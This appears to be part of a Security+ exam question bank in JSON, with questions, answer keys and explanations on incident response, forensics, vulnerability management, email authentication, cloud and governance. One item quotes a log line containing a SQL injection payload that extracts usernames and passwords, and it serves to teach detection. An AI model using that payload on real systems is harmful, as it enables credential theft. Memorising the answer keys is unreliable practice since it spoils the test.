    {"type":"mcq","question":"Two weeks after an incident is closed, the IR team holds a meeting to document what went well, what went wrong, and what process improvements would prevent recurrence. Which IR phase is this?","difficulty":"Exam Level","topic":"Incident Response","objective":"4.8","options":{"A":"Recovery","B":"Lessons Learned","C":"Detection","D":"Analysis"},"answer":"B","explanation":"Lessons Learned is the post-incident retrospective phase — produces actionable improvements to detection, response, and prevention. It is the FINAL phase of the IR process and drives organizational learning. Skipping it is a common organizational failure that leaves the same vulnerabilities open for future incidents.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"During an incident investigation, the IR team determines that the attacker exploited a vulnerable web server that was patched 2 years late and lacked WAF protection. They identify these as the underlying conditions enabling the breach. Which IR activity is this?","difficulty":"Hard","topic":"Incident Response","objective":"4.8","options":{"A":"Containment","B":"Threat hunting","C":"Root cause analysis","D":"Lessons learned"},"answer":"C","explanation":"Root cause analysis (RCA) identifies the underlying conditions that allowed the incident to occur — typically a combination of technical gaps, process failures, or organizational decisions. RCA drives meaningful fix prioritization. It runs in parallel with / informs Lessons Learned. Lessons Learned (D) is the broader retrospective; RCA is specifically the causal investigation.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"In digital forensics, a documented record showing every person who handled evidence, what they did with it, and when — is critical for legal admissibility. What is this called?","difficulty":"Foundational","topic":"Incident Response","objective":"4.8","options":{"A":"Legal hold","B":"E-discovery","C":"Chain of custody","D":"Acquisition log"},"answer":"C","explanation":"Chain of custody documents every transfer and handling of evidence to ensure integrity — critical for courts to accept the evidence as untampered. Breaking the chain (gap in documentation, unauthorized handling) typically renders evidence inadmissible. Legal hold (A) preserves data from deletion. E-discovery (B) is the data-production process for litigation. Acquisition log (D) is part of chain of custody but not the whole concept.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"An organization receives notice of pending litigation and must preserve all relevant data — including emails, files, and backup tapes — from routine deletion. What is this called?","difficulty":"Exam Level","topic":"Incident Response","objective":"4.8","options":{"A":"Chain of custody","B":"Legal hold","C":"Right to be forgotten","D":"Data retention policy"},"answer":"B","explanation":"Legal hold is a notice obligating an organization to preserve potentially relevant evidence ahead of litigation — overrides normal data retention/deletion schedules. Violating a legal hold (continuing to delete data) can result in spoliation sanctions. Chain of custody (A) is evidence handling documentation. Right to be forgotten (C) is the OPPOSITE — the right to demand deletion. Data retention policy (D) governs normal deletion schedules; legal hold suspends it.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"Investigating a malware outbreak, an analyst sees firewall logs showing host 10.1.2.50 made the FIRST outbound connection to the C2 server at 09:14, followed by hosts 10.1.2.51, 10.1.2.52, and 10.1.2.53 connecting between 09:18-09:27. Each later host had received an SMB connection from 10.1.2.50 before its C2 connection. Which host is BEST classified as 'patient zero'?","difficulty":"Hard","topic":"Forensics & Investigations","objective":"4.9","options":{"A":"10.1.2.50 — first outbound C2 and source of SMB to others","B":"10.1.2.51 — first to receive SMB connection","C":"10.1.2.53 — last in the chain","D":"All four are patient zero"},"answer":"A","explanation":"Patient zero is the FIRST infected host in an outbreak — the entry point. 10.1.2.50 made the earliest outbound C2 connection (first contact) AND served as the source of lateral SMB connections to the others (propagating the infection). The other hosts are downstream infections, not patient zero. Identifying patient zero through cross-correlated log timeline is exam-tested.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"An analyst sees the following Nmap scan output snippet:\nPORT     STATE  SERVICE\n22/tcp   open   ssh\n80/tcp   open   http\n445/tcp  open   microsoft-ds\n3389/tcp open   ms-wbt-server\nWhich BEST describes this host?","difficulty":"Exam Level","topic":"Forensics & Investigations","objective":"4.9","options":{"A":"A Linux server","B":"A Windows host with Linux and remote-access services exposed","C":"A network printer","D":"A firewall appliance"},"answer":"B","explanation":"Port 22 (SSH) suggests Linux/Unix shell — but ports 445 (SMB / Microsoft-DS) + 3389 (RDP / ms-wbt-server) are Windows-specific services. The combination indicates a Windows host running SSH (common with OpenSSH Server feature on Windows 10+ or Cygwin) — or a dual-stack environment. Most importantly, the exposed RDP + SMB on an externally-accessible host is a significant attack surface. Reading Nmap output to identify host type is exam-tested.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A Wireshark capture shows traffic patterns: lots of small TCP SYN packets to many different destination ports on a single target host, no SYN-ACK responses for most, occasional RST responses. Which attack technique BEST matches this?","difficulty":"Exam Level","topic":"Forensics & Investigations","objective":"4.9","options":{"A":"SYN flood","B":"Port scan","C":"DDoS amplification","D":"DNS poisoning"},"answer":"B","explanation":"The pattern — SYN to many DIFFERENT ports on ONE target, expecting responses to identify open services — is a port scan. The RST responses indicate closed ports; absence of SYN-ACK on others means filtered or closed. SYN flood (A) overwhelms ONE port with many SYNs to exhaust state. DDoS amplification (C) sends large volume from many sources to overload. DNS poisoning (D) is not visible in this pattern. Reading tool output to identify attacks is the Tier-1 PBQ archetype.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A SIEM alert fires after seeing this in the web server log:\nGET /products?id=1' UNION SELECT username,password FROM users-- HTTP/1.1\nWhich attack does this stem indicate?","difficulty":"Foundational","topic":"Forensics & Investigations","objective":"4.9","options":{"A":"Cross-site scripting","B":"SQL injection","C":"Buffer overflow","D":"Directory traversal"},"answer":"B","explanation":"The payload `' UNION SELECT username,password FROM users--` is a textbook SQL injection — closing the original query's quote, adding a UNION clause to extract from the users table, and commenting out the remainder. XSS would involve script tags (`<script>...</script>`). Buffer overflow would not be visible in a normal HTTP request. Directory traversal uses `../` to escape the document root.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"Investigating a suspected breach, an analyst correlates: (a) firewall log showing inbound RDP connection from a non-corporate IP at 02:33, (b) endpoint log showing privilege-escalation activity on the same host at 02:38, (c) DNS log showing the host querying a known C2 domain at 02:42. Which forensic activity is the analyst performing?","difficulty":"Hard","topic":"Forensics & Investigations","objective":"4.9","options":{"A":"Vulnerability scanning","B":"Log correlation across data sources","C":"Pen testing","D":"Threat hunting via hypothesis"},"answer":"B","explanation":"Log correlation — cross-referencing events across multiple data sources (firewall, endpoint, DNS) with timestamp alignment — reconstructs the attack timeline. CompTIA 4.9 enumerates these as the standard log/data sources for investigation. The pattern (initial access → privesc → C2 callback) is a classic attack-chain reconstruction. Vulnerability scanning (A) checks for unpatched flaws. Pen testing (C) actively exploits. Threat hunting (D) is hypothesis-driven proactive search BEFORE alerts; here an alert already fired.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"During an investigation, the analyst needs to capture every packet flowing between the suspected compromised server and the rest of the network for a 6-hour window. Which data source is MOST appropriate?","difficulty":"Foundational","topic":"Forensics & Investigations","objective":"4.9","options":{"A":"Firewall logs","B":"Endpoint logs","C":"Packet capture","D":"NetFlow"},"answer":"C","explanation":"Packet captures (PCAP) record every byte of traffic — the highest-fidelity network data source for forensics, sufficient to reconstruct sessions, extract files, and decrypt traffic if keys are available. Firewall logs (A) show connection events but not packet contents. Endpoint logs (B) show host-level activity, not network traffic. NetFlow (D) summarizes connection metadata (source/dest, bytes, duration) but not packet contents. PCAP is the answer when full traffic reconstruction is needed.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A CVSS base score of 9.8 is assigned to a vulnerability. What does this number tell you?","difficulty":"Foundational","topic":"Vulnerability Management","objective":"4.3","options":{"A":"It is critical and should be patched immediately","B":"It has been exploited 9.8% of the time","C":"It affects 9.8 systems","D":"It is the 9.8th vulnerability discovered this year"},"answer":"A","explanation":"CVSS (Common Vulnerability Scoring System) base scores range 0.0-10.0. Per CVSS v3: 9.0-10.0 is CRITICAL severity. A 9.8 indicates: high exploitability + significant impact + likely remote unauthenticated exploitation. Immediate patching priority. Other interpretations (B-D) misunderstand the scoring system entirely.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A vulnerability scan reports 'High: PHP 5.4.0 - Remote Code Execution' on a server. Investigation confirms the server actually runs PHP 7.4, not 5.4. What is this scan finding called?","difficulty":"Exam Level","topic":"Vulnerability Management","objective":"4.3","options":{"A":"True positive","B":"True negative","C":"False positive","D":"False negative"},"answer":"C","explanation":"False positive — the scanner reports a vulnerability that does NOT actually exist (often because of version banner-grab error or misconfiguration of the scanner). High false-positive rates damage team trust in the scanner. False negative (D) is missing a real vulnerability — much more dangerous. CompTIA explicitly enumerates these in 4.3 under vulnerability identification.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A vulnerability is identified as CVE-2024-1234. What does the 'CVE' prefix denote?","difficulty":"Foundational","topic":"Vulnerability Management","objective":"4.3","options":{"A":"Critical Vulnerability Enumeration","B":"Common Vulnerability Enumeration / Exposure","C":"Computer Virus Entry","D":"Confidentiality-Validity-Exposure score"},"answer":"B","explanation":"CVE (Common Vulnerabilities and Exposures) is the standardized identifier scheme for publicly-disclosed vulnerabilities, maintained by MITRE. Format is CVE-{year}-{sequence}. CVE provides the identifier; CVSS provides the severity score. Knowing both is exam-tested.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"After patching a critical vulnerability, what should the security team do NEXT to confirm the patch worked?","difficulty":"Foundational","topic":"Vulnerability Management","objective":"4.3","options":{"A":"Mark the vulnerability as closed in the tracker","B":"Re-scan or otherwise validate the remediation","C":"Move on to the next vulnerability","D":"Send a notification email to leadership"},"answer":"B","explanation":"Validation of remediation — re-scanning the affected systems — confirms the patch was actually applied and the vulnerability is closed. Without re-scan, patches may have failed silently, been reverted, or missed some systems. CompTIA 4.3 explicitly enumerates 'rescanning / audit / verification' as the validation step. The other options skip the verification step.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"An organization cannot patch a critical vulnerability immediately because the vendor patch breaks application compatibility. They add a WAF rule that blocks exploitation attempts while waiting for a working patch. What is this strategy called?","difficulty":"Exam Level","topic":"Vulnerability Management","objective":"4.3","options":{"A":"Risk acceptance","B":"Compensating controls","C":"Risk transfer","D":"Patching"},"answer":"B","explanation":"Compensating controls are alternative mitigations that reduce risk when the primary remediation (patching) cannot be applied. WAF blocking exploit traffic provides protection while a working patch is sourced. CompTIA 4.3 explicitly enumerates 'compensating controls' alongside 'patching' as response options. Risk acceptance (A) would mean doing nothing. Risk transfer (C) is insurance/contract.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"An email server administrator publishes a TXT record: 'v=spf1 include:_spf.google.com -all'. What does this protocol enforce?","difficulty":"Exam Level","topic":"Email & Web Security","objective":"4.5","options":{"A":"Which servers are authorized to send mail from this domain","B":"How the message body is cryptographically signed","C":"What action receivers should take on auth failures","D":"How long messages can sit in the queue"},"answer":"A","explanation":"SPF (Sender Policy Framework) publishes the list of IP addresses / servers authorized to send mail FROM a domain. The '-all' (hard fail) means receivers should reject mail from any other source. SPF only checks SENDER IP. DKIM (B) handles cryptographic signing of message content. DMARC (C) tells receivers what action to take on auth failures.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"Which email security protocol adds a cryptographic signature to the message body, allowing the receiver to verify the message has not been altered in transit?","difficulty":"Exam Level","topic":"Email & Web Security","objective":"4.5","options":{"A":"SPF","B":"DKIM","C":"DMARC","D":"S/MIME"},"answer":"B","explanation":"DKIM (DomainKeys Identified Mail) signs the message body + selected headers with a private key; the receiver verifies the signature using the public key published in DNS. This proves the message hasn't been tampered with AND that it came from someone with the signing key. SPF (A) only validates sending IP. DMARC (C) is the policy on what to do when SPF/DKIM fails. S/MIME (D) is end-to-end encryption + signing between users, not domain-level.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A domain owner publishes a DMARC record specifying 'p=reject; rua=mailto:dmarc@example.com'. What does this tell mail receivers?","difficulty":"Hard","topic":"Email & Web Security","objective":"4.5","options":{"A":"Quarantine messages that fail SPF or DKIM","B":"Reject messages that fail SPF or DKIM authentication alignment, and send aggregate reports to dmarc@example.com","C":"Accept all messages, just log failures","D":"Encrypt all messages with the public key"},"answer":"B","explanation":"DMARC (Domain-based Message Authentication, Reporting, and Conformance) builds on SPF + DKIM to specify the receiver's POLICY action: 'p=none' (monitor only), 'p=quarantine' (treat as suspicious), 'p=reject' (refuse delivery entirely). The 'rua' tag specifies where aggregate reports are sent. Together, SPF + DKIM + DMARC form the email-trio that prevents domain spoofing.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"multi-select","question":"Which TWO email security technologies together enable detection of domain spoofing in inbound email?","difficulty":"Foundational","topic":"Email & Web Security","objective":"4.5","options":{"A":"SPF","B":"DMARC","C":"IMAP","D":"SMTPS"},"answer":["A","B"],"explanation":"SPF (authorized sending servers) + DMARC (policy on failure) work together to detect and act on domain spoofing. DKIM (signing) is the third leg of the trio. IMAP (C) is a mail-retrieval protocol unrelated to anti-spoofing. SMTPS (D) is encrypted SMTP, securing transport but not authenticating the sender domain.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A newly provisioned server has its host-based intrusion prevention system (HIPS) configured to block any execution from temporary directories, USB-mounted media, or user download folders. Which hardening category does this represent?","difficulty":"Foundational","topic":"Endpoint & Server Hardening","objective":"4.1","options":{"A":"Endpoint protection installation","B":"Disabling ports/protocols","C":"Default password changes","D":"Removal of unnecessary software"},"answer":"A","explanation":"HIPS (Host-based Intrusion Prevention System) is endpoint protection — software installed on the host to monitor and block malicious activity at the host level. CompTIA 2.5 + 4.1 enumerate this as a hardening category. Disabling ports/protocols (B) reduces network attack surface. Default password changes (C) addresses credentials. Removal of unnecessary software (D) reduces installed attack surface — also a valid hardening category but distinct from active HIPS protection.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"An organization standardizes a 'gold image' Windows server build with specific GPO settings, hardening configurations, and an approved software list. They use this image for every new server deployment. Which hardening practice is this?","difficulty":"Exam Level","topic":"Endpoint & Server Hardening","objective":"4.1","options":{"A":"Secure baseline","B":"Sandboxing","C":"Patching","D":"Code signing"},"answer":"A","explanation":"Secure baseline is the standardized, hardened configuration applied to every new system of a given type. CompTIA 4.1 enumerates the secure-baseline lifecycle (Establish → Deploy → Maintain). Gold images, GPOs, and Configuration-as-Code all enforce baselines at scale. Sandboxing (B) isolates execution. Patching (C) addresses specific vulnerabilities. Code signing (D) verifies code provenance.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"After a SIEM alert fires for an account compromise indicator, a playbook automatically disables the account, terminates active sessions, captures the host for forensics, and pages the IR team. What enables this orchestrated response?","difficulty":"Exam Level","topic":"Automation & SOAR","objective":"4.7","options":{"A":"Vulnerability scanner","B":"SOAR (Security Orchestration, Automation, and Response)","C":"NetFlow analyzer","D":"SIEM alone"},"answer":"B","explanation":"SOAR platforms execute playbooks — automated multi-step responses across multiple security tools — triggered by SIEM alerts or other events. The four actions described (disable account + terminate sessions + capture host + page team) cross IAM, EDR, forensics, and ticketing systems; orchestrating them is SOAR's purpose. SIEM (D) alerts and correlates but doesn't natively orchestrate cross-tool actions — SOAR adds the orchestration layer.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"In a typical IaaS shared responsibility model, which security responsibility BELONGS to the cloud customer?","difficulty":"Exam Level","topic":"Cloud Security & Shared Responsibility","objective":"3.1","options":{"A":"Physical security of the datacenter","B":"Hypervisor patching","C":"Patching the guest OS on customer VMs","D":"Networking hardware maintenance"},"answer":"C","explanation":"In IaaS (Infrastructure as a Service), the cloud customer owns the OS and above — patching the guest OS, configuring applications, managing data. The provider owns the underlying physical infrastructure + hypervisor. Physical security (A), hypervisor patching (B), and networking hardware (D) are all provider responsibilities. This is exam-tested via the responsibility matrix.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A company migrates from IaaS to SaaS for their email system. Which security responsibility BECOMES the provider's (was the customer's in IaaS)?","difficulty":"Hard","topic":"Cloud Security & Shared Responsibility","objective":"3.1","options":{"A":"Email content / user data","B":"Application security (the email software itself)","C":"User access management","D":"Account credentials"},"answer":"B","explanation":"In SaaS (Software as a Service), the provider operates the application — application security, patching, and operations are now their responsibility (was customer's in IaaS). The customer retains responsibility for: their data (A), user access management (C), credentials (D), and access policies. SaaS shifts the most responsibility to the provider — but data and identity remain customer obligations.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A cloud architect designs a public-facing web tier and a private database tier. Where should the Web Application Firewall (WAF) be placed in the network architecture?","difficulty":"Exam Level","topic":"Cloud Security & Shared Responsibility","objective":"3.2","options":{"A":"Between the internet and the public web tier","B":"Between the web tier and the database tier","C":"Inside the database tier","D":"Between the application and its dependencies"},"answer":"A","explanation":"WAF inspects HTTP/HTTPS traffic for application-layer attacks (SQLi, XSS, CSRF, etc.). It must be placed in the path of inbound web traffic — between the internet and the web servers — to filter attacks before they reach the application. Placing it deeper (B-D) loses visibility into the original client requests + lets malicious traffic in before inspection. The vendor-neutral placement reasoning is a Tier-1 PBQ pattern.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"In a cloud architecture using public + private subnets, where should the load balancer for public web traffic be placed?","difficulty":"Foundational","topic":"Cloud Security & Shared Responsibility","objective":"3.2","options":{"A":"In the public subnet, with web servers in the private subnet","B":"In the private subnet, with web servers in the public subnet","C":"In a third subnet with no internet access","D":"Both public and private subnets simultaneously"},"answer":"A","explanation":"The load balancer must be reachable from the internet → public subnet. Web servers themselves should sit in the private subnet, receiving traffic only from the LB — never directly internet-exposed. This is the canonical cloud zoning pattern: public-facing components in public subnets, application + data tiers in private. Provider-neutral terms (public/private subnet, not 'public ELB' or 'Azure LB') is the SY0-701 framing per VoC research.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A company hosts a hybrid environment: an on-prem datacenter for the database (regulatory requirement) + a public cloud for the web tier (scalability). Connection between them is over a dedicated leased line. Which architecture term BEST describes this?","difficulty":"Exam Level","topic":"Cloud Security & Shared Responsibility","objective":"3.1","options":{"A":"Pure on-prem","B":"Pure cloud","C":"Hybrid cloud","D":"Multi-cloud"},"answer":"C","explanation":"Hybrid cloud combines on-prem infrastructure with cloud, with connectivity between them — typically for regulatory, latency, or migration reasons. The dedicated leased line provides the private connectivity layer. Multi-cloud (D) means using MULTIPLE public-cloud providers simultaneously (e.g., AWS + Azure); not relevant if only one cloud is in play.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A company encrypts customer credit card numbers stored in their database. Which data state is being protected by this encryption?","difficulty":"Foundational","topic":"Data Protection","objective":"3.3","options":{"A":"Data at rest","B":"Data in transit","C":"Data in use","D":"Data in motion"},"answer":"A","explanation":"Data at rest is data stored on persistent media (databases, files, backups, archives) — encryption at this state protects against breach of the storage medium. Data in transit (B) is data moving across networks (TLS protects this). Data in use (C) is data being actively processed in memory (homomorphic encryption + secure enclaves protect this). 'Data in motion' (D) is a synonym for transit.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A company replaces social-security numbers in their analytics database with random tokens that map back to the real SSNs via a separately-secured token vault. The analytics team can compute aggregates but cannot recover the real SSNs without separate authorization. Which data-protection technique is this?","difficulty":"Exam Level","topic":"Data Protection","objective":"3.3","options":{"A":"Encryption","B":"Hashing","C":"Tokenization","D":"Masking"},"answer":"C","explanation":"Tokenization replaces sensitive values with non-sensitive substitutes (tokens) that map to the originals via a vault. Aggregates / referential integrity work; sensitive values are inaccessible without the vault. Encryption (A) keeps the sensitive value but encrypts it — reversible with key. Hashing (B) is one-way (not reversible). Masking (D) shows partial value (e.g., XXXX-XXXX-1234) — typically for display, not data-at-rest substitution.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A GDPR-regulated dataset must remain within the European Union and cannot be processed in datacenters outside the EU. Which data-protection concept is being enforced?","difficulty":"Exam Level","topic":"Data Protection","objective":"3.3","options":{"A":"Data classification","B":"Data sovereignty","C":"Data masking","D":"Data tokenization"},"answer":"B","explanation":"Data sovereignty is the principle that data is subject to the laws of the country/region where it physically resides — GDPR's geographic restrictions for EU personal data are the canonical example. Cloud providers offer 'region-pinning' to comply. Data classification (A) is the labeling step. Masking + tokenization (C, D) are protection techniques but don't address the location/sovereignty dimension.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"A company evaluating architectures lists trade-offs: 'option A is cheaper to operate but harder to recover from failure; option B is more expensive but has built-in resilience.' Which two considerations are these?","difficulty":"Exam Level","topic":"Architecture Models","objective":"3.1","options":{"A":"Cost vs. Ease of recovery","B":"Cost vs. Scalability","C":"Cost vs. Compute","D":"Cost vs. Power"},"answer":"A","explanation":"CompTIA 3.1 enumerates architectural-decision considerations including: availability, resilience, cost, responsiveness, scalability, ease of deployment, risk transference, ease of recovery, patch availability, power, compute. Cost vs ease-of-recovery is the classic trade-off — pay more upfront for HA/replication, or save money but accept longer recovery times. Knowing these consideration categories is exam-tested for architectural-judgment scenarios.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    {"type":"mcq","question":"An operational technology (OT) network controls a power plant. Which architectural property is MOST critical?","difficulty":"Exam Level","topic":"Architecture Models","objective":"3.1","options":{"A":"Ease of deployment","B":"Availability + safety (real-time deterministic response)","C":"Cost optimization","D":"Bring-your-own-device support"},"answer":"B","explanation":"OT / ICS / SCADA systems prioritize availability and safety above all else — uptime drives safety (power, water, manufacturing). Real-time deterministic response is required for control loops. This is the OPPOSITE of typical IT priority (where confidentiality often comes first). The CompTIA SY0-701 expanded coverage of OT/ICS/SCADA (per VoC S7) reflects this domain's growing security importance.","source":"curated-secplus-phase3","addedVersion":"7.4.0","addedDate":"2026-05-27"},
    // ── Domain 5 balance batch (v7.65.0, 2026-07-10) ───────────────────────
    // 11 exemplars restoring the curated bank's SY0-701 blueprint alignment:
    // Domain 5 was 13.3% actual vs 20% blueprint. Targets the three starved
    // governance topics — Security Awareness & Training (5.6), Security
    // Governance (5.1), Audits & Assessments (5.5). Two-agent gated.
    {"type":"mcq","question":"An employee receives an email that appears to be from the CEO urgently demanding the purchase of prepaid gift cards, and the employee suspects it is a phishing attempt. According to security awareness best practices, what should the employee do FIRST?","difficulty":"Foundational","topic":"Security Awareness & Training","objective":"5.6","options":{"A":"Report the message through the organization's designated phishing reporting process","B":"Reply to the sender to confirm whether the urgent request is actually legitimate","C":"Delete the email right away so that no one else in the company can be tricked by it","D":"Forward the email to every coworker with a warning not to open the suspicious message"},"answer":"A","explanation":"Reporting a suspected phish through the sanctioned channel (a report button or the security team) lets responders analyze it, block the sender, and warn others — this is the core 'recognize and report' behavior awareness programs teach. (B) Wrong — replying confirms the mailbox is live and monitored and tips off the attacker; you never validate a suspected phish by engaging the sender. (C) Wrong — deleting destroys evidence responders need and does nothing to protect coworkers who may receive the same lure. (D) Wrong — mass-forwarding spreads the malicious content, invites accidental clicks, and causes panic; escalation belongs with the security team, not the whole staff.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"A user account that normally authenticates during business hours from the corporate office suddenly logs in at 3 a.m. from another country and begins querying databases the account has never accessed before. In the context of anomalous behavior recognition, how is this activity BEST categorized?","difficulty":"Exam Level","topic":"Security Awareness & Training","objective":"5.6","options":{"A":"Unintentional behavior, because the user most likely triggered the access accidentally without meaning to","B":"Risky behavior, because the user knowingly chose to bypass a documented security policy to work faster","C":"Expected behavior, because privileged users routinely require after-hours access to business-critical systems","D":"Unexpected behavior, because the activity deviates sharply from the account's established baseline"},"answer":"D","explanation":"Unexpected behavior is activity that deviates sharply from an established baseline of normal patterns (time, location, and systems touched) and often signals a compromised account or malicious insider. (A) Wrong — unintentional behavior is accidental and non-malicious, such as a misaddressed email or a lost drive; deliberate off-hours foreign logins and novel database queries are not accidental. (B) Wrong — risky behavior is a user knowingly doing something risky yet self-directed, like shadow IT; nothing here shows the legitimate user chose these actions, and the pattern points to compromise. (C) Wrong — labeling it expected ignores that it directly contradicts the account's normal behavior, which is exactly what makes it anomalous.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"A company delivers security awareness training only once, during new-hire onboarding, and never revisits it. An assessor flags this as a weakness in the program. Which improvement BEST addresses the assessor's concern?","difficulty":"Exam Level","topic":"Security Awareness & Training","objective":"5.6","options":{"A":"Extend the length of the single onboarding session so that it can cover many more topics in far greater depth","B":"Add recurring refresher training delivered on a regular, scheduled basis throughout employment","C":"Require every new hire to read and sign the acceptable use policy before any system access is granted","D":"Replace the instructor-led onboarding module with a self-paced video that employees watch on their own time"},"answer":"B","explanation":"Effective awareness programs pair INITIAL training with RECURRING training; scheduled refreshers counter knowledge decay and keep staff current on evolving threats — precisely the gap a one-time-only program leaves. (A) Wrong — cramming more depth into a single session does not solve retention over time; people still forget and threats still evolve after that one event. (C) Wrong — signing the AUP is a governance acknowledgment of policy, not ongoing awareness, and it too happens only once at onboarding. (D) Wrong — swapping the delivery format from instructor-led to video changes how the single session is consumed but leaves it a one-time event, which is the actual problem.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"multi-select","question":"(Choose THREE) A security awareness program teaches staff to recognize possible insider threat indicators among coworkers. Which of the following are behavioral indicators the program should train employees to notice and report?","difficulty":"Exam Level","topic":"Security Awareness & Training","objective":"5.6","options":{"A":"A colleague repeatedly attempts to access data and systems that are unrelated to their assigned job role","B":"A colleague copies large volumes of sensitive files onto personal removable media without any authorization","C":"A colleague consistently finishes assigned security awareness training well ahead of the stated deadline","D":"A colleague frequently works unusual hours specifically to access systems when few other people are present","E":"A colleague reports a suspicious phishing email to the security team through the proper reporting channel"},"answers":["A","B","D"],"explanation":"Insider threat indicators are behaviors that deviate from a normal work role and suggest data theft or sabotage. (A) Correct — probing systems outside one's job role signals privilege misuse or reconnaissance. (B) Correct — bulk-copying sensitive data to unauthorized removable media is a classic exfiltration indicator. (D) Correct — deliberately working odd hours to act when oversight is low is a well-documented insider red flag. (C) Wrong — completing required training early is benign, even positive, and is not a threat indicator. (E) Wrong — reporting a phishing email through the proper channel is exactly the security-conscious behavior the program wants to encourage, not a warning sign.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"Under data governance roles, which party determines the purposes and the means of processing personal data and holds primary accountability for how that data is handled?","difficulty":"Foundational","topic":"Security Governance","objective":"5.1","options":{"A":"Data custodian","B":"Data processor","C":"Data controller","D":"Data protection officer"},"answer":"C","explanation":"The data controller decides why and how personal data is processed and bears primary accountability for its protection and lawful use. (A) Wrong — a data custodian implements and maintains the technical controls (storage, backups, access enforcement) under direction from the owner or controller; it does not set purpose. (B) Wrong — a data processor acts on behalf of the controller and processes data strictly per the controller's instructions, so it does not determine the purpose or means. (D) Wrong — a data protection officer advises on and monitors privacy compliance but does not decide the processing purpose or means, nor carry the primary accountability that defines the controller.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"A multinational company wants each regional business unit to set its own security policies and make its own risk decisions so it can respond quickly to local regulations. Which governance structure does this approach BEST represent?","difficulty":"Exam Level","topic":"Security Governance","objective":"5.1","options":{"A":"Decentralized governance","B":"Centralized governance","C":"Regulatory governance","D":"Committee-based governance"},"answer":"A","explanation":"Decentralized governance distributes decision-making authority out to individual business units, trading enterprise-wide consistency for local flexibility and faster responsiveness to regional requirements — exactly what this company wants. (B) Wrong — centralized governance concentrates authority in a single central body to enforce uniform policy, which is the opposite of letting each unit decide. (C) Wrong — regulatory obligations are an external consideration that governance must account for, not a structural model for distributing decision authority. (D) Wrong — a committee or board is a mechanism describing who deliberates, but it does not by itself describe whether authority is concentrated centrally or pushed out to the units, which is the axis the scenario emphasizes.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"Which organizational document defines the acceptable and prohibited uses of company systems, networks, and data that every employee must acknowledge before being granted access?","difficulty":"Exam Level","topic":"Security Governance","objective":"5.1","options":{"A":"Change management policy","B":"Incident response policy","C":"Software development lifecycle (SDLC) policy","D":"Acceptable use policy (AUP)"},"answer":"D","explanation":"The acceptable use policy (AUP) spells out permitted and prohibited uses of organizational systems and data and is typically signed or acknowledged by users before access is granted. (A) Wrong — a change management policy governs how modifications to systems are requested, reviewed, approved, and implemented, not day-to-day user conduct. (B) Wrong — an incident response policy defines how security incidents are detected, reported, and handled, not the rules for routine system use. (C) Wrong — an SDLC policy governs the secure phases of building software and applies to developers' processes, not to general acceptable use by all employees. Only the AUP addresses per-user acceptable-use acknowledgment.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
